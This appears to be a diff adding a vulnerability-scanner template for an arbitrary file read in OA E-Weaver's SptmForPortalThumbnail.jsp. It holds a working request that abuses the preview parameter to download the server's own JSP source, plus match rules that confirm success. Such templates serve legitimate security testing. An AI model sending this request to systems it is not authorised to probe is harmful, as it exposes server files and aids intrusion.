@@ -1,0 +1,31 @@
+id: weaver-sptmforportalthumbnail-lfi
+brief:
+    title: OA E-Weaver SptmForPortalThumbnail - Arbitrary File Read
+    by: SleepingBag945
+    level: high
+    about: The controllable preview parameters of SptmForPortalThumbnail.jsp are not filtered and are directly spliced to the web root directory for file downloading.
+    label:
+        - weaver
+        - e-cology
+        - oa
+        - lfi
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/portal/SptmForPortalThumbnail.jsp?preview=portal/SptmForPortalThumbnail.jsp'
+      signs:
+        - "on": word
+          has:
+            - weaver.general.BaseBean
+            - getServletConfig
+          in: body
+          need: all
+        - "on": word
+          has:
+            - image/png
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 200
